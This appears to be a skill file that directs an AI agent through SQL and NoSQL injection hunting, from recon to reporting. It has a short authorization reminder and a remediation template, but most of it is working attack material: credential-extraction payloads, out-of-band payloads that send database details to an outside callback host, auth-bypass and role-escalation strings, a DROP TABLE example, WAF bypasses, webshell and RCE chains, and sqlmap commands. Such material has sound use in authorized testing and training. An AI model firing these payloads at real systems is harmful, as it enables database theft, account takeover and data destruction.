---
name: sqli-hunter-agent
description: >
  Elite SQL Injection hunting agent for bug bounty, CTF, pentests — web, Android, and API.
  ALWAYS activate for: SQL injection, SQLi, NoSQL injection, blind SQLi, time-based SQLi, error-based SQLi, second-order SQLi, auth bypass via SQL, UNION injection, OOB SQLi, MongoDB injection, WAF bypass for SQLi, sqlmap, ghauri, GraphQL SQLi, API SQLi, Android SQLi, ORM injection, stacked queries, DBMS fingerprinting, boolean-based blind, ORDER BY injection, SQLi chaining, or ANY request to find/test/exploit SQL-family injection vulnerabilities. Covers full kill chain: recon → surface mapping → DBMS fingerprint → payload escalation → WAF bypass → exploit → PoC → report. False-positive aware. Token-efficient. Never skips manual fingerprinting. 20+ year veteran mindset.
---

# SQLi Hunter Agent — Elite SQL Injection Methodology

> **Scope reminder**: Always verify authorization before testing any live target. This skill is for authorized pentests, bug bounty programs in-scope, and CTFs only.

---

## PHASE 0 — READ BEFORE STARTING

Read the relevant reference files based on the target type:
- **Web app** → `references/web-sqli.md`
- **Android / Mobile** → `references/android-sqli.md`
- **REST / GraphQL API** → `references/api-sqli.md`
- **NoSQL (MongoDB etc.)** → `references/nosql-injection.md`
- **WAF present / payloads blocked** → `references/waf-bypass.md`
- **Payload library** → `payloads/master-payload-list.md`

Then follow the MASTER WORKFLOW below.

---

## MASTER WORKFLOW (The Kill Chain)

### STEP 1 — RECON & SURFACE MAPPING

**Goal**: Find every injectable parameter — don't assume, enumerate.

**Attack Surface Checklist**:
```
GET/POST parameters          → id=, search=, q=, filter=, sort=, page=
URL path segments            → /user/123, /product/electronics
HTTP Headers                 → X-Forwarded-For, User-Agent, Referer, Cookie, X-Custom-*
JSON body keys               → {"username":"...", "filter":{...}}
XML body                     → <id>...</id>
GraphQL variables            → query { user(id: "...") }
Multipart form fields        → file upload metadata, filename=
Order/sort parameters        → orderBy=name, sortDir=asc
Search/filter fields         → especially ORM-built queries
Pagination params            → limit=, offset=, page=
Authentication params        → username, password, token, remember_me
Registration/profile fields  → username, email, address (→ 2nd order!)
Password reset tokens
Android: SharedPreferences, SQLite queries, ContentProvider URIs
API: route parameters, query strings, request body, auth headers
```

**Token-efficient recon tools** (use in this order, stop when surface found):
```bash
# Fast URL + param discovery
gau --subs TARGET | grep -E '\?.*=' | uro | tee params.txt
waybackurls TARGET | grep '=' | uro >> params.txt
katana -u https://TARGET -d 5 -jc -ef png,jpg,css -o katana.txt

# Extract parameters
cat params.txt | grep -oP '[?&][^=&]+(?==)' | sort -u

# JS endpoint mining (feeds into 2nd order discovery)
cat katana.txt | grep '\.js$' | jsluice urls | grep -E '\?.*='

# For Android: extract SQLite query strings from APK
jadx -d output/ target.apk && grep -r "rawQuery\|execSQL\|query(" output/ --include="*.java"
```

---

### STEP 2 — FINGERPRINT FIRST (Smart, Not Hard)

**Rule**: Never fire a full payload set blind. Fingerprint the DBMS first with minimal probes.

**Probe sequence** (use Burp Repeater / curl):

```
Step 1 — Break the query (detect injection point type):
  '              → string context
  "              → alternate string delimiter  
  `              → MySQL backtick context
  )              → close parenthesis context
  ')             → string + paren
  1' AND '1'='1  → string boolean
  1 AND 1=1      → numeric boolean
  1;--           → stacked query attempt

Step 2 — Confirm with benign boolean:
  1 AND 1=1--    → should behave NORMALLY
  1 AND 1=2--    → should behave DIFFERENTLY (no data / error)
  If both same → blind/filtered; escalate to time-based

Step 3 — DBMS fingerprint via error messages OR timing:
  MySQL:      ' AND extractvalue(1,concat(0x7e,version()))--
  MSSQL:      ' AND 1=CONVERT(int,@@version)--
  PostgreSQL: ' AND 1=cast(version() as int)--
  Oracle:     ' AND 1=utl_inaddr.get_host_address(version)--
  SQLite:     ' AND 1=CAST(sqlite_version() AS INT)--

Step 4 — If no visible error, try time-based DBMS probe:
  MySQL:      ' AND SLEEP(3)--
  MSSQL:      '; WAITFOR DELAY '0:0:3'--
  PostgreSQL: ' AND pg_sleep(3)--
  Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--
  SQLite:     (no native sleep; use heavy query instead)
```

**STOP**: After fingerprint, you know:
- Injection point location (param / header / body key)
- Context (string / numeric / blind / error-visible)
- DBMS type

Now proceed to the matching exploitation path.

---

### STEP 3 — EXPLOIT (By Type)

#### 3A — ERROR-BASED (fastest data extraction when visible)

**MySQL** (extractvalue / updatexml):
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)--
```

**MSSQL** (CONVERT trick):
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND 1=CONVERT(int,(SELECT TOP 1 CAST(username+':'+password AS NVARCHAR) FROM users))--
```

**PostgreSQL** (CAST):
```sql
' AND CAST((SELECT version()) AS INT)=1--
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)=1--
' AND 1=(SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Oracle** (XMLType / UTL):
```sql
' AND 1=2 UNION SELECT XMLType('<x>'||(SELECT banner FROM v$version WHERE rownum=1)||'</x>') FROM dual--
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
```

#### 3B — UNION-BASED (when output is reflected)

```sql
-- Step 1: Find column count
ORDER BY 1--   (increment until error → N-1 is column count)
UNION SELECT NULL--
UNION SELECT NULL,NULL--   (repeat until no error)

-- Step 2: Find printable column
UNION SELECT NULL,'SQLI_TEST',NULL--   (look for string in response)

-- Step 3: Extract data
UNION SELECT NULL,database(),NULL--
UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 1--
```

#### 3C — BLIND BOOLEAN-BASED (no visible output, no errors)

Use binary search pattern to extract data character by character:

```sql
-- Confirm blind:
1 AND 1=1--  (normal)   vs   1 AND 1=2--  (different)

-- Extract DB name length:
1 AND (SELECT LENGTH(database()))>5--

-- Extract DB name char by char (binary search):
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>77--
1 AND ASCII(SUBSTRING((SELECT database()),1,1))=109--  → 'm'

-- Complex boolean payload (nav1n0x style):
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Automate blind extraction** with sqlmap AFTER manual confirmation:
```bash
sqlmap -u "URL?id=1*" --level=5 --risk=3 --technique=B --dbms=mysql --batch --dbs
```

#### 3D — TIME-BASED BLIND (most stealthy, async-safe)

**Critical insight**: If an app processes params asynchronously (background threads, analytics logging), time-based may **fail silently** even on vulnerable params. Always try OOB next.

```sql
-- MySQL (confirm with 3s delay):
1' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>77,SLEEP(3),0)--

-- MSSQL:
'; IF (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 WAITFOR DELAY '0:0:3'--

-- PostgreSQL:
'; SELECT CASE WHEN (LENGTH(current_database())>1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- Oracle:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),3)--

-- Complex nav1n0x time-based:
' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>77,SLEEP(5),0)--
```

#### 3E — OUT-OF-BAND / OAST (async targets, $20k-earning technique)

> Use when time-based fails but param is likely vulnerable. Detects async SQLi, second-order, and logging injections. Use Burp Collaborator or interactsh.

```sql
-- MySQL (DNS):
LOAD_FILE(concat('\\\\',database(),'.COLLABORATOR.net\\a'))
' UNION SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT database()),0x2e,0x434f4c4c41424f5241544f52,0x2eNET,0x5c61))--

-- MSSQL (DNS via xp_dirtree):
'; exec master..xp_dirtree '//'+@@version+'.COLLABORATOR.net/a'--

-- PostgreSQL (DNS via COPY):
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.COLLABORATOR.net'--

-- Oracle (DNS via UTL_HTTP):
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
```

**Strategy**: Unique subdomain per parameter tested → precise source tracking in Collaborator logs.

---

### STEP 4 — SECOND-ORDER SQLi (most missed, highest signal-to-noise)

**Attack vectors** (store malicious input, trigger later):
```
Registration → username, display name, bio
Profile update → address, company, email
Referral/invite codes
Password change → old password field
File upload → filename metadata
API: PUT /users/{id} with payload in body fields
```

**Payloads to store**:
```sql
admin'--
' OR 1=1--
attacker'; UPDATE users SET role='admin' WHERE username='attacker'--
test' UNION SELECT NULL,password,NULL FROM users--
```

**Trigger flow**:
1. Store payload in registration/profile
2. Perform action that retrieves and uses that field in a new SQL query (password reset, admin panel lookup, search by stored value)
3. Observe delayed error/behavior change

**Source code signals** (white-box):
```python
# Dangerous patterns (stored value used raw in query):
cursor.execute(f"SELECT * FROM users WHERE username = '{stored_value}'")
db.query("SELECT * FROM orders WHERE customer = '" + username_from_db + "'")
```

---

### STEP 5 — AUTH BYPASS

```sql
-- Classic:
admin'--
admin'/*
' OR 1=1--
' OR '1'='1
' OR 1=1#
') OR ('1'='1
' OR 'x'='x

-- Username field specific:
admin'--
admin'#
') OR 1=1--
' OR 1=1 LIMIT 1--

-- Login form (both fields controlled):
username: admin'--  password: anything
username: ' OR 1=1-- password: anything

-- Hash bypass (MSSQL):
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

---

### STEP 6 — NoSQL INJECTION (MongoDB focus)

```javascript
// Auth bypass via operator injection (JSON body):
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// $where JavaScript injection (when enabled):
{"$where": "sleep(5000); return true;"}
{"$where": "function(){ return this.username == 'admin'; }"}

// Blind NoSQL extraction via regex:
{"username": {"$regex": "^a"}, "password": {"$exists": true}}
{"username": {"$regex": "^ad"}, "password": {"$exists": true}}
// (iterate regex prefix to extract character-by-character)

// URL-encoded (GET params):
?username[$ne]=x&password[$ne]=x
?username[$regex]=^admin&password[$ne]=x
?filter[$where]=sleep(5000)

// Array injection:
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": null}}
```

**Timing attack on MongoDB**:
```javascript
{"username": "admin", "password": {"$regex": "^a.*", "$options": "i"}}
// If response delays → character matches → build password character-by-character
```

---

### STEP 7 — API & GRAPHQL SQLi

**REST API injection surfaces**:
```
GET /api/users?id=1 UNION SELECT...
GET /api/search?q=test' OR 1=1--
POST /api/login  body: {"user":"admin'--","pass":"x"}
GET /api/products?sort=name; DROP TABLE--
GET /api/v2/items/1' OR '1'='1
X-User-ID: 1 UNION SELECT...
```

**GraphQL injection**:
```graphql
# Inject in argument values:
{ user(id: "1 UNION SELECT username,password FROM users--") { name } }
{ search(query: "test' OR 1=1--") { results } }

# Introspection first to map schema:
{ __schema { types { name fields { name } } } }
```

**Android ContentProvider injection**:
```java
// Vulnerable pattern:
Cursor c = db.rawQuery("SELECT * FROM data WHERE id=" + uri.getLastPathSegment(), null);

// Test via ADB:
adb shell content query --uri content://com.target.app.provider/users/1%20OR%201=1
adb shell content query --uri "content://com.target.app/items/1' UNION SELECT name,sql,null FROM sqlite_master--"
```

---

### STEP 8 — WAF BYPASS (when payloads are blocked)

**Bypass decision tree** (try in order, stop when one works):

```
1. CASE MIXING:        uNioN SeLecT
2. INLINE COMMENTS:    UN/**/ION/**/SEL/**/ECT
3. URL ENCODING:       %27 (') %20 (space) %23 (#)
4. DOUBLE ENCODING:    %2527 (%27 double-encoded)
5. WHITESPACE SUBS:    UNION%0ASELECT / UNION%09SELECT / UNION%0DSELECT
6. HEX ENCODING:       0x61646D696E (hex for 'admin')
7. CHAR FUNCTION:      CHAR(65)||CHAR(100)||CHAR(109)
8. STRING CONCAT:      'ad'||'min' / 'ad'+'min' / concat('ad','min')
9. SCIENTIFIC:         1e0 instead of 1
10. NEGATIVE INDEX:    /*!50000UNION*//*!50000SELECT*/
11. HPP (param):       ?id=1&id=UNION+SELECT--
12. CHUNKED ENCODING:  Transfer-Encoding: chunked (split payload across chunks)
13. JSON UNICODE:      {"user": "\u0061dmin'--"}
14. BASE64 (MySQL):    FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==')
```

**WAF-specific cheat payloads**:
```sql
-- Cloudflare bypass:
' /*!UNION*/ /*!SELECT*/ NULL,NULL--
%27+UNION+SELECT+NULL,NULL--

-- ModSecurity bypass:
'/*! UNION *//*! SELECT */NULL--

-- Akamai bypass:
1+UNION+SELECT+0x61646d696e,0x70617373--

-- Generic comment combo:
' UNION/**/SELECT/**/NULL,/**/NULL/**/--

-- Newline in keyword:
UNION
SELECT NULL--
```

---

### STEP 9 — FALSE POSITIVE ELIMINATION

**Critical checks before reporting**:

| Observation | False Positive Check |
|-------------|---------------------|
| Sleep delay occurred | Re-test 3x — is delay consistent? Network jitter? |
| Error message appeared | Is error from app logic (not DB)? Check non-SQL input |
| Boolean diff in response | Is diff meaningful (data change) or cosmetic (whitespace)? |
| OOB callback received | Is SSRF also possible without SQLi? |
| UNION output returned | Is it reflected from input or actual DB data? |

**Confirming TRUE POSITIVE**:
```
1. Boolean proof: both AND 1=1 (normal) AND AND 1=2 (different) must hold
2. Time proof: delay must be consistent and proportional (SLEEP(3) ≈ 3s, SLEEP(6) ≈ 6s)
3. Data proof: extract benign DB value (version(), database()) — never exfiltrate real PII
4. WAF false error: inject benign string that looks like SQL → no error? Then the error is from DB
```

---

### STEP 10 — CHAINING SQLi WITH OTHER BUGS

**High-value SQLi chains**:
```
SQLi → Auth Bypass → Admin Panel Access → RCE
SQLi → User Enumeration → Password Hash Dump → Account Takeover
SQLi (LOAD_FILE) → LFI/File Read
SQLi (INTO OUTFILE) → RCE / Webshell write
SQLi → SSRF via OOB DNS/HTTP callbacks
SQLi → Privilege Escalation (UPDATE role/is_admin)
SQLi + IDOR → Horizontal Privilege Escalation
SQLi + CSRF → Stored Auth Bypass
Second-Order SQLi → Blind XSS equivalent pattern (store → trigger admin action)
NoSQL Injection → Authentication Bypass → JWT Manipulation
```

---

### STEP 11 — PoC & REPORTING

**Minimum PoC requirements**:
```
1. Exact HTTP request (redacted sensitive data)
2. Payload used (URL-decoded)
3. DBMS confirmed (version string or timing proof)
4. What data was extracted (use database()/version() only — no PII)
5. Screenshot or response diff showing vulnerability
6. CVSS score estimate:
   - SQLi with data extraction → CVSS 9.8 (Critical)
   - Blind SQLi → CVSS 8.8+ (High-Critical)
   - Auth bypass SQLi → CVSS 9.8 (Critical)
7. Remediation: parameterized queries, ORM usage, input validation
```

**Bug bounty report template**:
```
## Vulnerability: SQL Injection ([Type]) in [Endpoint]
**Severity**: Critical / High
**CVSS**: 9.8

### Summary
[One-line description]

### Steps to Reproduce
1. Navigate to [URL]
2. Intercept request with Burp Suite
3. Modify [parameter] to: [payload]
4. Observe [response / delay / DNS callback]

### Impact
An attacker can [extract all DB data / bypass auth / achieve RCE].

### Proof of Concept
[HTTP Request screenshot]
[Response showing database() = 'targetdb']

### Remediation
Use parameterized queries or prepared statements.
```

---

## TOOLCHAIN (Efficiency-ranked)

```
Phase          Tool                    Purpose
─────────────────────────────────────────────────────────
Recon          gau, waybackurls, katana  URL + param discovery
Surface        ParamSpider, JSluice    JS endpoint + param mining
Interception   Burp Suite              Manual testing, Repeater, Intruder
DBMS ID        Manual probes (curl)    Fingerprint before tooling
OOB/OAST       Burp Collaborator / interactsh  Blind/async detection
Automation     sqlmap, ghauri          Post-confirmation extraction
Android        jadx, adb, drozer       APK reverse + ContentProvider test
Reporting      Markdown template       Structured bounty report
```

**sqlmap smart usage** (post-manual confirmation only):
```bash
# Basic:
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# With custom header injection:
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: *" --level=5 --risk=3

# POST body:
sqlmap -u "https://target.com/login" --data="user=admin&pass=x" -p user

# Custom tamper for WAF:
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch

# Second-order:
sqlmap -u "https://target.com/profile" --second-url="https://target.com/admin/users"

# Ghauri (faster, WAF-bypass native):
ghauri -u "https://target.com/page?id=1" --dbs --level=3
```

---

## QUICK REFERENCE — DBMS CHEATSHEET

| Feature | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---------|-------|-------|------------|--------|--------|
| Version | `@@version` | `@@version` | `version()` | `banner FROM v$version` | `sqlite_version()` |
| DB name | `database()` | `db_name()` | `current_database()` | `ora_database_name` | `(SELECT name FROM pragma_database_list)` |
| Tables | `information_schema.tables` | `sysobjects` | `information_schema.tables` | `all_tables` | `sqlite_master` |
| Comment | `--` `#` `/**/` | `--` | `--` | `--` | `--` |
| Sleep | `SLEEP(N)` | `WAITFOR DELAY '0:0:N'` | `pg_sleep(N)` | `DBMS_PIPE.RECEIVE_MESSAGE` | heavy query |
| Concat | `concat(a,b)` / `a||b` | `a+b` | `a||b` | `a||b` | `a||b` |
| Stacked | `;` (if allowed) | `;` | `;` | limited | `;` |

---

## MINDSET: TOP 1% HUNTER RULES

1. **Test EVERY parameter** — headers, cookies, JSON keys, XML nodes, path segments. Scanners miss headers 90% of the time.
2. **Fingerprint before firing** — 3 probes to confirm injection type saves 50 payloads.
3. **OAST first for blind** — time-based has false negatives on async code. OAST catches what time-based misses ($20k lesson).
4. **Second-order is underexplored** — most hunters skip it. Registration/profile fields that feed admin queries are gold.
5. **WAF is not a stop sign** — it's an obstacle. Try 5 bypass techniques before concluding not vulnerable.
6. **False positive kills credibility** — confirm with consistent time delay AND boolean AND data extraction.
7. **Chain the bug** — a blind SQLi that extracts admin creds + auth bypass = Critical, not just High.
8. **Android and API are blue ocean** — ContentProviders and GraphQL endpoints are massively undertested.
9. **Work smart** — 5 manual probes on the right endpoint beats 10,000 automated payloads on the wrong one.
10. **Document as you go** — screenshot every step; Burp export the winning request immediately.
